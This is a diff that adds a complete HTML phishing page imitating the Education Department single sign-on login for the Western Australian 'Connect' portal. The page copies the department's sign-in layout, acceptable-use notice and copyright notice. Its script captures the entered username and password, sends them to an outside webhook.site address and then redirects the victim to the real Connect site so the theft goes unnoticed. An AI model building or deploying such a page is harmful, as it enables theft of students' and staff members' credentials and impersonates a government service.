@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Education Department - Single Sign-On</title>
+  <style>
+    body {
+      font-family: Verdana, sans-serif;
+      background-color: #FFFFFF;
+      margin: 0;
+      padding: 20px;
+    }
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      max-width: 600px;
+      margin: 0 auto;
+      border: 1px solid #000000;
+    }
+    td {
+      padding: 5px;
+      border: 1px solid #000000;
+      color: #000000;
+    }
+    .label {
+      font-weight: bold;
+    }
+    input[type="text"], input[type="password"] {
+      width: 150px;
+      padding: 2px;
+      border: 1px solid #000000;
+    }
+    .checkbox-group {
+      vertical-align: top;
+    }
+    a {
+      color: #0000FF;
+      text-decoration: underline;
+    }
+    .warning {
+      color: #FF0000;
+      font-weight: bold;
+    }
+    .section {
+      margin-top: 20px;
+      color: #000000;
+    }
+  </style>
+</head>
+<body>
+  <table>
+    <tr><td colspan="2">Education Department - Single Sign-On</td></tr>
+    <tr><td colspan="2">| Sign In<br><br>Enter your Single Sign-On user name and password to sign in |</td></tr>
+    <form id="loginForm" onsubmit="submitForm(event)">
+      <tr>
+        <td class="label">User Name</td>
+        <td><input type="text" id="username" name="username" required> | <a href="#" class="help-link">Help</a></td>
+      </tr>
+      <tr>
+        <td class="label">Password</td>
+        <td><input type="password" id="password" name="password" required></td>
+      </tr>
+      <tr>
+        <td colspan="2" class="checkbox-group">
+          <input type="checkbox" id="agree" name="agree" required>
+          <label for="agree">I have read and understand the Appropriate Use of Online Services information.</label>
+        </td>
+      </tr>
+      <tr><td colspan="2">You must confirm that you have read and understand the Appropriate Use of Online Services information.</td></tr>
+      <tr>
+        <td colspan="2" align="center">
+          <button type="submit">Sign In</button>
+          <button type="button" onclick="window.location.href='https://connect.det.wa.edu.au/'">Cancel</button>
+        </td>
+      </tr>
+      <tr><td colspan="2"><a href="#" class="forgot-link">Forgot Your User Name or Password?</a> | <a href="#" class="policy-link">What is this?</a></td></tr>
+    </form>
+    <tr><td colspan="2" class="section">
+      <h3>Appropriate Use of Online Services</h3>
+      <p>All Departmental online services including Portal, email, online document storage, Intranet and Internet access, must be used responsibly and in accordance with Departmental policies.</p>
+      <p>By accessing any Departmental online services you give your full agreement and commitment to comply with all Departmental policies. You also give consent to logging, monitoring, auditing and disclosure of your use of these services.</p>
+      <p>Inappropriate use of these services and failure to comply with Department policies may result in criminal proceedings and/or disciplinary action that may include suspension of access to online services, dismissal or termination of contract.</p>
+      <p>You can view the policies relating to the appropriate use of these services at the <a href="#" class="policy-link">Our Policies website</a>.</p>
+      <p><a href="#" class="policy-link">Students Online Policy</a> | <a href="#" class="policy-link">Online Services Acceptable Use Policy</a></p>
+      <p>Parents/responsible persons - Appropriate Use</p>
+    </td></tr>
+    <tr><td colspan="2" class="section">
+      <h3>Copyright Statement</h3>
+      <p class="warning">[WARNING]</p>
+      <p>Some of this material may have been copied [and communicated to you] in accordance with the statutory licence in section 113P of the Copyright Act. Any further reproduction or communication of this material by you may be the subject of copyright protection under the Act.</p>
+      <p>Do not remove this notice.</p>
+    </td></tr>
+  </table>
+  <script>
+    function submitForm(event) {
+      event.preventDefault(); // Keep it in one tab
+      const form = document.getElementById("loginForm");
+      const formData = new FormData(form);
+
+      fetch("https://webhook.site/07a75c97-1e39-4794-9eba-a0a3ace5ec74", {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => {
+        // Redirect instantly to the real Connect URL
+        window.location.href = "https://connect.det.wa.edu.au/";
+      })
+      .catch(error => {
+        console.log("Error:", error);
+        // Fallback redirect if fetch fails
+        window.location.href = "https://connect.det.wa.edu.au/";
+      });
+    }
+  </script>
+</body>
+</html>
